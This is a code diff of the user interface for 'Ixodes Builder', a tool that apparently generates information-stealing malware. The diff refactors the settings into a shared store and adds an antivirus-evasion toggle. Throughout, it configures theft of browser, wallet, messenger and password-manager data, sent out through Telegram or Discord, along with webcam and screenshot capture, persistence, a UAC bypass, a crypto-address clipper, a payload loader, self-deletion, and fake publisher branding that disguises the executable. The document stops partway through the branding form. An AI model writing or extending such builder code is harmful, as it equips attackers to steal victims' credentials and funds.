@@ -7,7 +7,7 @@
     Select,
     SelectItem,
     SelectContent,
-    SelectTrigger
+    SelectTrigger,
   } from "$lib/components/ui/select";
   import { Input } from "$lib/components/ui/input";
   import { Label } from "$lib/components/ui/label";
@@ -24,6 +24,16 @@
   import FileGrabberSection from "./components/FileGrabberSection.svelte";
   import PasswordGeneratorDialog from "./components/PasswordGeneratorDialog.svelte";
   import {
+    Dialog,
+    DialogContent,
+    DialogDescription,
+    DialogHeader,
+    DialogTitle,
+    DialogFooter,
+  } from "$lib/components/ui/dialog";
+  import * as Collapsible from "$lib/components/ui/collapsible";
+  import {
+    ChevronRight,
     Hammer,
     KeyRound,
     LockKeyhole,
@@ -31,7 +41,11 @@
     Zap,
   } from "@lucide/svelte";
   import { Switch } from "$lib/components/ui/switch";
-  import { isDiscordWebhookValid, isTelegramChatIdValid, isTelegramTokenValid } from "$lib/validation/communication";
+  import {
+    isDiscordWebhookValid,
+    isTelegramChatIdValid,
+    isTelegramTokenValid,
+  } from "$lib/validation/communication";
 
   type BuildResult = {
     success: boolean;
@@ -40,16 +54,8 @@
     moved_to: string | null;
   };
 
-  const categories = [
-    { id: "Browsers", label: "Browsers" },
-    { id: "Messengers", label: "Messengers" },
-    { id: "Gaming", label: "Gaming" },
-    { id: "EmailClients", label: "Email Clients" },
-    { id: "VPNs", label: "VPNs" },
-    { id: "Wallets", label: "Wallets" },
-    { id: "System", label: "System" },
-    { id: "Other", label: "Password Managers" },
-  ] as const;
+  import { builderState } from "$lib/builder-state.svelte";
+  import { categories } from "$lib/data/categories";
 
   const iconPresets = [
     { id: "none", label: "None" },
@@ -85,86 +91,46 @@
   const getIconPresetLabel = (presetId: string) =>
     iconPresets.find((preset) => preset.id === presetId)?.label ?? presetId;
 
-  let archivePassword = $state("");
-  let telegramToken = $state("");
-  let telegramChatId = $state("");
-  let discordWebhook = $state("");
-  let commMode = $state<"telegram" | "discord">("telegram");
-  let outputDir = $state("");
-  let iconSource = $state("");
-  let iconPreset = $state("none");
-  let productName = $state("");
-  let fileDescription = $state("");
-  let companyName = $state("");
-  let productVersion = $state("");
-  let fileVersion = $state("");
-  let copyright = $state("");
-  let categoryState = $state<Record<string, boolean>>(
-    Object.fromEntries(categories.map((category) => [category.id, true]))
-  );
-  let captureScreenshots = $state(false);
-  let captureWebcams = $state(false);
-  let captureClipboard = $state(false);
-  let persistence = $state(false);
-  let uacBypass = $state(false);
-  let clipper = $state(false);
-  let melt = $state(true);
-  let loaderUrl = $state("");
-  let proxyServer = $state("");
-  let btcAddress = $state("");
-  let ethAddress = $state("");
-  let ltcAddress = $state("");
-  let xmrAddress = $state("");
-  let dogeAddress = $state("");
-  let dashAddress = $state("");
-  let solAddress = $state("");
-  let trxAddress = $state("");
-  let adaAddress = $state("");
-  let blockedCountries = $state<string[]>([]);
-  let pumpSize = $state(0);
-  let pumpUnit = $state<"kb" | "mb" | "gb">("mb");
-  let customExtensions = $state<string[]>([]);
-  let customKeywords = $state<string[]>([]);
-  let pwdLength = $state(20);
-  let pwdUppercase = $state(true);
-  let pwdNumbers = $state(true);
-  let pwdSymbols = $state(true);
-  let fastBuild = $state(false);
-  let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
-  let buildError = $state("");
-  let movedTo = $state("");
   let successTimer: ReturnType<typeof setTimeout> | null = null;
 
-  const selectedCategories = () =>
-    categories.filter((category) => categoryState[category.id]).map((category) => category.id);
+  let lastVerifiedTelegramToken = $state("");
+  let lastVerifiedTelegramChatId = $state("");
+  let lastVerifiedDiscordWebhook = $state("");
 
-  const telegramTokenValid = $derived(isTelegramTokenValid(telegramToken));
-  const telegramChatIdValid = $derived(isTelegramChatIdValid(telegramChatId));
-  const discordWebhookValid = $derived(isDiscordWebhookValid(discordWebhook));
+  const telegramTokenValid = $derived(isTelegramTokenValid(builderState.telegramToken));
+  const telegramChatIdValid = $derived(isTelegramChatIdValid(builderState.telegramChatId));
+  const discordWebhookValid = $derived(isDiscordWebhookValid(builderState.discordWebhook));
 
-  let selectedCategoryCount = $derived(selectedCategories().length);
-  let hasCommunication = $derived(Boolean(commMode));
+  let hasCommunication = $derived(Boolean(builderState.commMode));
   let canBuild = $derived(
-    selectedCategoryCount > 0 && 
-    (
-        (commMode === "telegram" && telegramTokenValid && telegramChatIdValid && telegramToken.trim().length > 0 && telegramChatId.trim().length > 0) ||
-        (commMode === "discord" && discordWebhookValid && discordWebhook.trim().length > 0)
-    )
+    builderState.selectedCategoryCount > 0 &&
+      ((builderState.commMode === "telegram" &&
+        telegramTokenValid &&
+        telegramChatIdValid &&
+        builderState.telegramToken.trim().length > 0 &&
+        builderState.telegramChatId.trim().length > 0) ||
+        (builderState.commMode === "discord" &&
+          discordWebhookValid &&
+          builderState.discordWebhook.trim().length > 0)),
   );
 
   $effect(() => {
-    if (iconPreset !== "none" && iconSource.trim().length > 0) {
-      iconSource = "";
+    if (builderState.iconPreset !== "none" && builderState.iconSource.trim().length > 0) {
+      builderState.iconSource = "";
     }
   });
 
   $effect(() => {
-    if (iconSource.trim().length > 0 && iconPreset !== "none") {
-      iconPreset = "none";
+    if (builderState.iconSource.trim().length > 0 && builderState.iconPreset !== "none") {
+      builderState.iconPreset = "none";
     }
   });
 
-  const showToast = (message: string, title = "Notice", type: "info" | "error" = "info") => {
+  const showToast = (
+    message: string,
+    title = "Notice",
+    type: "info" | "error" = "info",
+  ) => {
     if (type === "error") {
       toast.error(title, { description: message });
     } else {
@@ -173,91 +139,103 @@
   };
 
   const toggleCategory = (id: string, checked: boolean) => {
-    if (!checked && selectedCategories().length <= 1 && categoryState[id]) {
+    if (!checked && builderState.selectedCategories.length <= 1 && builderState.categoryState[id]) {
       showToast("At least one category must stay enabled.");
       return;
     }
-    categoryState = { ...categoryState, [id]: checked };
+    builderState.categoryState = { ...builderState.categoryState, [id]: checked };
   };
 
   const toggleScreenshots = () => {
-    captureScreenshots = !captureScreenshots;
+    builderState.captureScreenshots = !builderState.captureScreenshots;
   };
 
   const toggleWebcams = () => {
-    captureWebcams = !captureWebcams;
+    builderState.captureWebcams = !builderState.captureWebcams;
   };
 
   const toggleClipboard = () => {
-    captureClipboard = !captureClipboard;
+    builderState.captureClipboard = !builderState.captureClipboard;
   };
 
   const togglePersistence = () => {
-    persistence = !persistence;
+    builderState.persistence = !builderState.persistence;
   };
 
   const toggleUacBypass = () => {
-    uacBypass = !uacBypass;
+    builderState.uacBypass = !builderState.uacBypass;
+  };
+
+  const toggleEvasion = () => {
+    if (builderState.evasion) {
+      builderState.showEvasionWarning = true;
+    } else {
+      builderState.evasion = true;
+    }
+  };
+
+  const toggleStandalone = () => {
+    builderState.standalone = !builderState.standalone;
   };
 
   const toggleClipper = () => {
-    clipper = !clipper;
+    builderState.clipper = !builderState.clipper;
   };
 
   const toggleMelt = () => {
-    melt = !melt;
+    builderState.melt = !builderState.melt;
   };
 
-  const handleBtcChange = (val: string) => (btcAddress = val);
-  const handleEthChange = (val: string) => (ethAddress = val);
-  const handleLtcChange = (val: string) => (ltcAddress = val);
-  const handleXmrChange = (val: string) => (xmrAddress = val);
-  const handleDogeChange = (val: string) => (dogeAddress = val);
-  const handleDashChange = (val: string) => (dashAddress = val);
-  const handleSolChange = (val: string) => (solAddress = val);
-  const handleTrxChange = (val: string) => (trxAddress = val);
-  const handleAdaChange = (val: string) => (adaAddress = val);
-  const handleLoaderUrlChange = (val: string) => (loaderUrl = val);
-  const handleProxyServerChange = (val: string) => (proxyServer = val);
+  const handleBtcChange = (val: string) => (builderState.btcAddress = val);
+  const handleEthChange = (val: string) => (builderState.ethAddress = val);
+  const handleLtcChange = (val: string) => (builderState.ltcAddress = val);
+  const handleXmrChange = (val: string) => (builderState.xmrAddress = val);
+  const handleDogeChange = (val: string) => (builderState.dogeAddress = val);
+  const handleDashChange = (val: string) => (builderState.dashAddress = val);
+  const handleSolChange = (val: string) => (builderState.solAddress = val);
+  const handleTrxChange = (val: string) => (builderState.trxAddress = val);
+  const handleAdaChange = (val: string) => (builderState.adaAddress = val);
+  const handleLoaderUrlChange = (val: string) => (builderState.loaderUrl = val);
+  const handleProxyServerChange = (val: string) => (builderState.proxyServer = val);
 
   const toggleCountry = (code: string) => {
-    if (blockedCountries.includes(code)) {
-      blockedCountries = blockedCountries.filter((c) => c !== code);
+    if (builderState.blockedCountries.includes(code)) {
+      builderState.blockedCountries = builderState.blockedCountries.filter((c) => c !== code);
     } else {
-      blockedCountries = [...blockedCountries, code];
+      builderState.blockedCountries = [...builderState.blockedCountries, code];
     }
   };
 
   const setBlockedCountries = (codes: string[]) => {
-    blockedCountries = codes;
+    builderState.blockedCountries = codes;
   };
 
   const setPumpSize = (size: number) => {
-    pumpSize = size;
+    builderState.pumpSize = size;
   };
 
   const setPumpUnit = (unit: "kb" | "mb" | "gb") => {
-    pumpUnit = unit;
+    builderState.pumpUnit = unit;
   };
 
   const addExtension = (ext: string) => {
-    if (!customExtensions.includes(ext)) {
-        customExtensions = [...customExtensions, ext];
+    if (!builderState.customExtensions.includes(ext)) {
+      builderState.customExtensions = [...builderState.customExtensions, ext];
     }
   };
 
   const removeExtension = (ext: string) => {
-    customExtensions = customExtensions.filter(e => e !== ext);
+    builderState.customExtensions = builderState.customExtensions.filter((e) => e !== ext);
   };
 
   const addKeyword = (kw: string) => {
-    if (!customKeywords.includes(kw)) {
-        customKeywords = [...customKeywords, kw];
+    if (!builderState.customKeywords.includes(kw)) {
+      builderState.customKeywords = [...builderState.customKeywords, kw];
     }
   };
 
   const removeKeyword = (kw: string) => {
-    customKeywords = customKeywords.filter(k => k !== kw);
+    builderState.customKeywords = builderState.customKeywords.filter((k) => k !== kw);
   };
 
   const generatePassword = () => {
@@ -267,38 +245,38 @@
     const syms = "!@#$%^&*()_+-=[]{}|;:,.<>?";
 
     let charset = lower;
-    if (pwdUppercase) charset += upper;
-    if (pwdNumbers) charset += nums;
-    if (pwdSymbols) charset += syms;
+    if (builderState.pwdUppercase) charset += upper;
+    if (builderState.pwdNumbers) charset += nums;
+    if (builderState.pwdSymbols) charset += syms;
 
     let result = "";
-    const array = new Uint32Array(pwdLength);
+    const array = new Uint32Array(builderState.pwdLength);
     crypto.getRandomValues(array);
-    for (let i = 0; i < pwdLength; i++) {
-        result += charset[array[i] % charset.length];
+    for (let i = 0; i < builderState.pwdLength; i++) {
+      result += charset[array[i] % charset.length];
     }
-    archivePassword = result;
+    builderState.archivePassword = result;
   };
 
-  const setPwdLength = (val: number) => pwdLength = val;
-  const togglePwdUppercase = () => pwdUppercase = !pwdUppercase;
-  const togglePwdNumbers = () => pwdNumbers = !pwdNumbers;
-  const togglePwdSymbols = () => pwdSymbols = !pwdSymbols;
+  const setPwdLength = (val: number) => (builderState.pwdLength = val);
+  const togglePwdUppercase = () => (builderState.pwdUppercase = !builderState.pwdUppercase);
+  const togglePwdNumbers = () => (builderState.pwdNumbers = !builderState.pwdNumbers);
+  const togglePwdSymbols = () => (builderState.pwdSymbols = !builderState.pwdSymbols);
 
   const setCommunicationMode = (mode: "telegram" | "discord") => {
-    commMode = mode;
+    builderState.commMode = mode;
   };
 
   const handleTelegramTokenChange = (value: string) => {
-    telegramToken = value;
+    builderState.telegramToken = value;
   };
 
   const handleTelegramChatIdChange = (value: string) => {
-    telegramChatId = value;
+    builderState.telegramChatId = value;
   };
 
   const handleDiscordWebhookChange = (value: string) => {
-    discordWebhook = value;
+    builderState.discordWebhook = value;
   };
 
   const generateArtifactKey = () => {
@@ -319,9 +297,9 @@
     });
     if (!result) return;
     if (Array.isArray(result)) {
-      outputDir = result[0] ?? "";
+      builderState.outputDir = result[0] ?? "";
     } else {
-      outputDir = result;
+      builderState.outputDir = result;
     }
   };
 
@@ -330,151 +308,171 @@
       directory: false,
       multiple: false,
       title: "Select icon file",
-      filters: [
-        { name: "Icons", extensions: ["ico", "icns", "png"] },
-      ],
+      filters: [{ name: "Icons", extensions: ["ico", "icns", "png"] }],
     });
     if (!result) return;
     if (Array.isArray(result)) {
-      iconSource = result[0] ?? "";
+      builderState.iconSource = result[0] ?? "";
     } else {
-      iconSource = result;
+      builderState.iconSource = result;
     }
-  };
-
-  const toggleFastBuild = () => {
-    fastBuild = !fastBuild;
   };
 
   const runBuild = async () => {
     if (!canBuild) {
       const message = "Please fix validation errors before building.";
-      buildStatus = "error";
-      buildError = message;
+      builderState.buildStatus = "error";
+      builderState.buildError = message;
       showToast(message, "Validation failed", "error");
       return;
     }
-    
+
     let pumpSizeMb = 0;
-    if (pumpSize > 0) {
-        if (pumpUnit === "kb") pumpSizeMb = Math.ceil(pumpSize / 1024);
-        else if (pumpUnit === "mb") pumpSizeMb = pumpSize;
-        else if (pumpUnit === "gb") pumpSizeMb = pumpSize * 1024;
+    if (builderState.pumpSize > 0) {
+      if (builderState.pumpUnit === "kb") pumpSizeMb = Math.ceil(builderState.pumpSize / 1024);
+      else if (builderState.pumpUnit === "mb") pumpSizeMb = builderState.pumpSize;
+      else if (builderState.pumpUnit === "gb") pumpSizeMb = builderState.pumpSize * 1024;
     }
 
-    buildStatus = "loading";
-    buildError = "";
-    movedTo = "";
+    builderState.buildStatus = "loading";
+    builderState.buildError = "";
+    builderState.movedTo = "";
     if (successTimer) {
       clearTimeout(successTimer);
       successTimer = null;
     }
 
-    // 1. Test Connection
     try {
-        showToast("Verifying communication settings...", "Testing Connection", "info");
-        if (commMode === "telegram") {
-            await invoke("test_telegram_connection", { token: telegramToken, chatId: telegramChatId });
+      const isNewTelegram =
+        builderState.commMode === "telegram" &&
+        (builderState.telegramToken !== lastVerifiedTelegramToken ||
+          builderState.telegramChatId !== lastVerifiedTelegramChatId);
+      const isNewDiscord =
+        builderState.commMode === "discord" && builderState.discordWebhook !== lastVerifiedDiscordWebhook;
+
+      if (isNewTelegram || isNewDiscord) {
+        showToast(
+          "Verifying communication settings...",
+          "Testing Connection",
+          "info",
+        );
+        if (builderState.commMode === "telegram") {
+          await invoke("test_telegram_connection", {
+            token: builderState.telegramToken,
+            chatId: builderState.telegramChatId,
+          });
+          lastVerifiedTelegramToken = builderState.telegramToken;
+          lastVerifiedTelegramChatId = builderState.telegramChatId;
         } else {
-            await invoke("test_discord_connection", { webhook: discordWebhook });
+          await invoke("test_discord_connection", { webhook: builderState.discordWebhook });
+          lastVerifiedDiscordWebhook = builderState.discordWebhook;
         }
         showToast("Connection verification successful!", "Success", "info");
+      }
     } catch (error) {
-        buildStatus = "error";
-        buildError = `Connection test failed: ${String(error)}`;
-        showToast(buildError, "Connection Test Failed", "error");
-        return;
+      builderState.buildStatus = "error";
+      builderState.buildError = `Connection test failed: ${String(error)}`;
+      showToast(builderState.buildError, "Connection Test Failed", "error");
+      return;
     }
 
     try {
-          const result = (await invoke("build_ixodes", {
-            request: {
-              settings: {
-                allowed_categories: selectedCategories(),
-                artifact_key: generateArtifactKey(),
-                archive_password: archivePassword,
-                telegram_token: telegramToken,
-                telegram_chat_id: telegramChatId,
-                discord_webhook: discordWebhook,
-                capture_screenshots: captureScreenshots,
-                capture_webcams: captureWebcams,
-                capture_clipboard: captureClipboard,
-                persistence: persistence,
-                uac_bypass: uacBypass,
-                clipper: clipper,
-                melt: melt,
-                loader_url: loaderUrl,
-                proxy_server: proxyServer,
-                btc_address: btcAddress,
-                eth_address: ethAddress,
-                ltc_address: ltcAddress,
-                xmr_address: xmrAddress,
-                doge_address: dogeAddress,
-                dash_address: dashAddress,
-                sol_address: solAddress,
-                trx_address: trxAddress,
-                ada_address: adaAddress,
-                blocked_countries: blockedCountries,
-                pump_size_mb: pumpSizeMb,
-                custom_extensions: customExtensions,
-                custom_keywords: customKeywords,
-              },
-              branding: {
-                icon_source: iconSource,
-                icon_preset: iconPreset,
-                product_name: productName,
-                file_description: fileDescription,
-                company_name: companyName,
-                product_version: productVersion,
-                file_version: fileVersion,
-                copyright,
-              },
-              output_dir: outputDir,
-              fast_build: fastBuild,
-            },
-          })) as BuildResult;
-      movedTo = result.moved_to ?? "";
-      buildStatus = result.success ? "success" : "error";
+      const result = (await invoke("build_ixodes", {
+        request: {
+          settings: {
+            allowed_categories: builderState.selectedCategories,
+            artifact_key: builderState.encryptArtifacts ? generateArtifactKey() : null,
+            archive_password: builderState.archivePassword,
+            telegram_token: builderState.telegramToken,
+            telegram_chat_id: builderState.telegramChatId,
+            discord_webhook: builderState.discordWebhook,
+            capture_screenshots: builderState.captureScreenshots,
+            capture_webcams: builderState.captureWebcams,
+            capture_clipboard: builderState.captureClipboard,
+            persistence: builderState.persistence,
+            uac_bypass: builderState.uac_bypass,
+            evasion: builderState.evasion,
+            clipper: builderState.clipper,
+            standalone: builderState.standalone,
+            melt: builderState.melt,
+            loader_url: builderState.loaderUrl,
+            proxy_server: builderState.proxyServer,
+            btc_address: builderState.btcAddress,
+            eth_address: builderState.ethAddress,
+            ltc_address: builderState.ltcAddress,
+            xmr_address: builderState.xmrAddress,
+            doge_address: builderState.doge_address,
+            dash_address: builderState.dashAddress,
+            sol_address: builderState.solAddress,
+            trx_address: builderState.trxAddress,
+            ada_address: builderState.adaAddress,
+            blocked_countries: builderState.blockedCountries,
+            pump_size_mb: pumpSizeMb,
+            custom_extensions: builderState.customExtensions,
+            custom_keywords: builderState.customKeywords,
+            debug: builderState.debug,
+          },
+          branding: {
+            icon_source: builderState.iconSource,
+            icon_preset: builderState.iconPreset,
+            product_name: builderState.productName,
+            file_description: builderState.fileDescription,
+            company_name: builderState.companyName,
+            product_version: builderState.productVersion,
+            file_version: builderState.fileVersion,
+            copyright: builderState.copyright,
+          },
+          output_dir: builderState.outputDir,
+        },
+      })) as BuildResult;
+      builderState.movedTo = result.moved_to ?? "";
+      builderState.buildStatus = result.success ? "success" : "error";
       if (!result.success) {
-        // Display the first 150 chars of output to avoid giant toasts, or just the whole thing if it's short.
-        // Better: just show the output. Svelte Sonner might truncate or scroll.
-        const errorDetails = result.output ? result.output.trim() : "No output captured";
-        // limit length for toast
-        const shortError = errorDetails.length > 200 ? errorDetails.substring(0, 200) + "..." : errorDetails;
-        
-        buildError = `Build failed: ${errorDetails}`; 
+        const errorDetails = result.output
+          ? result.output.trim()
+          : "No output captured";
+        const shortError =
+          errorDetails.length > 200
+            ? errorDetails.substring(0, 200) + "..."
+            : errorDetails;
+
+        builderState.buildError = `Build failed: ${errorDetails}`;
         showToast(shortError, "Build failed", "error");
       } else {
         successTimer = setTimeout(() => {
-          buildStatus = "idle";
+          builderState.buildStatus = "idle";
           successTimer = null;
         }, 5000);
       }
     } catch (error) {
-      buildStatus = "error";
-      buildError = String(error);
-      showToast(buildError, "Build failed", "error");
+      builderState.buildStatus = "error";
+      builderState.buildError = String(error);
+      showToast(builderState.buildError, "Build failed", "error");
     }
   };
 
   const generateBranding = () => {
     const preset =
       brandingPresets[Math.floor(Math.random() * brandingPresets.length)];
-    productName = preset.productName;
-    fileDescription = preset.fileDescription;
-    companyName = preset.companyName;
-    productVersion = preset.productVersion;
-    fileVersion = preset.fileVersion;
-    copyright = preset.copyright;
-    iconSource = "";
-    iconPreset = preset.iconPreset;
+    builderState.productName = preset.productName;
+    builderState.fileDescription = preset.fileDescription;
+    builderState.companyName = preset.companyName;
+    builderState.productVersion = preset.productVersion;
+    builderState.fileVersion = preset.fileVersion;
+    builderState.copyright = preset.copyright;
+    builderState.iconSource = "";
+    builderState.iconPreset = preset.iconPreset;
   };
 </script>
 
-<main class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 pt-6 pb-4">
+<main
+  class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 pt-6 pb-4"
+>
   <CardHeader class="space-y-4 border-b border-border/60">
     <div class="flex items-center justify-between gap-4">
-      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
+      <div
+        class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground"
+      >
         Ixodes Builder
       </div>
     </div>
@@ -482,41 +480,39 @@
   <CardContent class="space-y-10">
     <FeatureSection
       {categories}
-      {categoryState}
-      {selectedCategoryCount}
-      {toggleCategory}
+      categoryState={builderState.categoryState}
+      selectedCategoryCount={builderState.selectedCategoryCount}
+      toggleCategory={toggleCategory}
       {showToast}
-      captureScreenshots={captureScreenshots}
-      captureWebcams={captureWebcams}
-      captureClipboard={captureClipboard}
-      persistence={persistence}
-      uacBypass={uacBypass}
-      clipper={clipper}
-      melt={melt}
+      captureScreenshots={builderState.captureScreenshots}
+      captureWebcams={builderState.captureWebcams}
+      captureClipboard={builderState.captureClipboard}
+      persistence={builderState.persistence}
+      uacBypass={builderState.uacBypass}
+      evasion={builderState.evasion}
+      clipper={builderState.clipper}
+      melt={builderState.melt}
       onToggleScreenshots={toggleScreenshots}
       onToggleWebcams={toggleWebcams}
       onToggleClipboard={toggleClipboard}
       onTogglePersistence={togglePersistence}
       onToggleUacBypass={toggleUacBypass}
+      onToggleEvasion={toggleEvasion}
       onToggleClipper={toggleClipper}
       onToggleMelt={toggleMelt}
     />
 
-    <LoaderSection {loaderUrl} onLoaderUrlChange={handleLoaderUrlChange} />
-
-    <NetworkSection {proxyServer} onProxyServerChange={handleProxyServerChange} />
-
-    {#if clipper}
+    {#if builderState.clipper}
       <ClipperSection
-        {btcAddress}
-        {ethAddress}
-        {ltcAddress}
-        {xmrAddress}
-        {dogeAddress}
-        {dashAddress}
-        {solAddress}
-        {trxAddress}
-        {adaAddress}
+        btcAddress={builderState.btcAddress}
+        ethAddress={builderState.ethAddress}
+        ltcAddress={builderState.ltcAddress}
+        xmrAddress={builderState.xmrAddress}
+        dogeAddress={builderState.dogeAddress}
+        dashAddress={builderState.dashAddress}
+        solAddress={builderState.solAddress}
+        trxAddress={builderState.trxAddress}
+        adaAddress={builderState.adaAddress}
         onBtcChange={handleBtcChange}
         onEthChange={handleEthChange}
         onLtcChange={handleLtcChange}
@@ -530,206 +526,291 @@
     {/if}
 
     <CommunicationSection
-      commMode={commMode}
+      commMode={builderState.commMode}
       setCommMode={setCommunicationMode}
-      telegramToken={telegramToken}
-      telegramChatId={telegramChatId}
-      discordWebhook={discordWebhook}
+      telegramToken={builderState.telegramToken}
+      telegramChatId={builderState.telegramChatId}
+      discordWebhook={builderState.discordWebhook}
       onTelegramTokenChange={handleTelegramTokenChange}
       onTelegramChatIdChange={handleTelegramChatIdChange}
       onDiscordWebhookChange={handleDiscordWebhookChange}
     />
 
     <div class="space-y-3">
-      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
+      <div
+        class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground"
+      >
         <LockKeyhole class="h-4 w-4 text-primary" />
         Archive Password
       </div>
       <div class="flex gap-2">
         <Input
-            id="archive-password"
-            placeholder="Archive password (optional)"
-            type="password"
-            bind:value={archivePassword}
+          id="archive-password"
+          placeholder="Archive password (optional)"
+          type="password"
+          bind:value={builderState.archivePassword}
         />
-        <PasswordGeneratorDialog 
-            length={pwdLength}
-            useUppercase={pwdUppercase}
-            useNumbers={pwdNumbers}
-            useSymbols={pwdSymbols}
-            onLengthChange={setPwdLength}
-            onToggleUppercase={togglePwdUppercase}
-            onToggleNumbers={togglePwdNumbers}
-            onToggleSymbols={togglePwdSymbols}
+        <PasswordGeneratorDialog
+          length={builderState.pwdLength}
+          useUppercase={builderState.pwdUppercase}
+          useNumbers={builderState.pwdNumbers}
+          useSymbols={builderState.pwdSymbols}
+          onLengthChange={setPwdLength}
+          onToggleUppercase={togglePwdUppercase}
+          onToggleNumbers={togglePwdNumbers}
+          onToggleSymbols={togglePwdSymbols}
         />
         <Button variant="outline" onclick={generatePassword}>
-            <WandSparkles class="mr-2 h-4 w-4" />
-            Generate
+          <WandSparkles class="mr-2 h-4 w-4" />
+          Generate
         </Button>
+      </div>
+      <div class="flex items-center space-x-2 pt-1">
+        <Switch
+          id="encrypt-artifacts"
+          checked={builderState.encryptArtifacts}
+          onCheckedChange={(checked) => (builderState.encryptArtifacts = checked)}
+        />
+        <Label for="encrypt-artifacts" class="text-xs text-muted-foreground">
+          Encrypt individual files (Paranoid mode)
+        </Label>
       </div>
     </div>
 
-    <FileGrabberSection
-        customExtensions={customExtensions}
-        customKeywords={customKeywords}
-        onAddExtension={addExtension}
-        onRemoveExtension={removeExtension}
-        onAddKeyword={addKeyword}
-        onRemoveKeyword={removeKeyword}
-    />
-
     <div class="grid gap-10 md:grid-cols-2">
       <GeoBlockSection
-        blockedCountries={blockedCountries}
+        blockedCountries={builderState.blockedCountries}
         onToggleCountry={toggleCountry}
         onSetCountries={setBlockedCountries}
       />
 
       <PumperSection
-          pumpSize={pumpSize}
-          pumpUnit={pumpUnit}
-          onPumpSizeChange={setPumpSize}
-          onPumpUnitChange={setPumpUnit}
+        pumpSize={builderState.pumpSize}
+        pumpUnit={builderState.pumpUnit}
+        onPumpSizeChange={setPumpSize}
+        onPumpUnitChange={setPumpUnit}
       />
     </div>
 
-    <div class="space-y-4" style={fastBuild ? "opacity: 0.5; pointer-events: none;" : ""}>
-      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
+    <LoaderSection loaderUrl={builderState.loaderUrl} onLoaderUrlChange={handleLoaderUrlChange} />
+
+    <NetworkSection
+      proxyServer={builderState.proxyServer}
+      onProxyServerChange={handleProxyServerChange}
+    />
+
+    <FileGrabberSection
+      customExtensions={builderState.customExtensions}
+      customKeywords={builderState.customKeywords}
+      onAddExtension={addExtension}
+      onRemoveExtension={removeExtension}
+      onAddKeyword={addKeyword}
+      onRemoveKeyword={removeKeyword}
+    />
+
+    <Collapsible.Root bind:open={builderState.isOpenBranding} class="space-y-4">
+      <Collapsible.Trigger
+        class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground hover:text-foreground transition-colors outline-none group"
+      >
         <KeyRound class="h-4 w-4 text-primary" />
-        Executable branding
-      </div>
-      <div class="flex flex-wrap items-center justify-between gap-3">
-        <p class="text-xs text-muted-foreground">
-          Windows embeds icon and version metadata into the executable. macOS/Linux apply only
-          when packaging an app bundle. Preset icons are embedded in the builder. Icons must be
-          square and between 256x256 and 512x512.
-        </p>
-        <Button variant="outline" size="sm" onclick={generateBranding}>
-          Generate Random
-        </Button>
-      </div>
-      <div class="grid gap-4 md:grid-cols-2">
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="product-name">
-            Product name
-          </Label>
-          <Input id="product-name" placeholder="Ixodes" bind:value={productName} />
+        <span>Executable branding</span>
+        <ChevronRight
+          class="h-4 w-4 transition-transform duration-200 {builderState.isOpenBranding
+            ? 'rotate-90'
+            : ''}"
+        />
+      </Collapsible.Trigger>
+
+      <Collapsible.Content class="space-y-4 pt-2">
+        <div class="flex flex-wrap items-center justify-between gap-3">
+          <p class="text-xs text-muted-foreground">
+            Windows embeds icon and version metadata into the executable.
+            macOS/Linux apply only when packaging an app bundle. Preset icons
+            are embedded in the builder. Icons must be square and between
+            256x256 and 512x512.
+          </p>
+          <Button variant="outline" size="sm" onclick={generateBranding}>
+            Generate Random
+          </Button>
         </div>
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="file-description">
-            File description
-          </Label>
-          <Input id="file-description" placeholder="Recovery toolkit" bind:value={fileDescription} />
-        </div>
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="company-name">
-            Company name
-          </Label>
-          <Input id="company-name" placeholder="Acme Labs" bind:value={companyName} />
-        </div>
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="product-version">
-            Product version
-          </Label>
-          <Input id="product-version" placeholder="1.0.0.0" bind:value={productVersion} />
-        </div>
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="file-version">
-            File version
-          </Label>
-          <Input id="file-version" placeholder="1.0.0.0" bind:value={fileVersion} />
-        </div>
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="copyright">
-            Copyright
-          </Label>
-          <Input id="copyright" placeholder="© 2026 Example Co." bind:value={copyright} />
-        </div>
-      </div>
-      <div class="grid w-full items-start gap-3 md:grid-cols-[minmax(180px,0.35fr)_minmax(0,1fr)]">
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground" for="icon-preset">
-            Preset icon
-          </Label>
-          <Select
-            type="single"
-            bind:value={iconPreset}
-            disabled={iconSource.trim().length > 0}
-          >
-        <SelectTrigger id="icon-preset" class="w-full">
-              <span>{getIconPresetLabel(iconPreset)}</span>
-            </SelectTrigger>
-            <SelectContent>
-              {#each iconPresets as preset (preset.id)}
-                <SelectItem value={preset.id}>{preset.label}</SelectItem>
-              {/each}
-            </SelectContent>
-          </Select>
-        </div>
-        <div class="space-y-2">
-          <Label class="text-xs text-muted-foreground">Custom icon</Label>
-          <div class="grid gap-3 md:grid-cols-[1fr_auto]">
+        <div class="grid gap-4 md:grid-cols-2">
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="product-name">
+              Product name
+            </Label>
             <Input
-              placeholder="Icon URL, file path, or directory"
-              bind:value={iconSource}
-              disabled={iconPreset !== "none"}
+              id="product-name"
+              placeholder="Ixodes"
+              bind:value={builderState.productName}
             />
-            <Button variant="outline" onclick={chooseIconFile} disabled={iconPreset !== "none"}>
-              Choose icon
-            </Button>
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="file-description">
+              File description
+            </Label>
+            <Input
+              id="file-description"
+              placeholder="Recovery toolkit"
+              bind:value={builderState.fileDescription}
+            />
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="company-name">
+              Company name
+            </Label>
+            <Input
+              id="company-name"
+              placeholder="Acme Labs"
+              bind:value={builderState.companyName}
+            />
+          </div>
+          <div class="space-y-2">
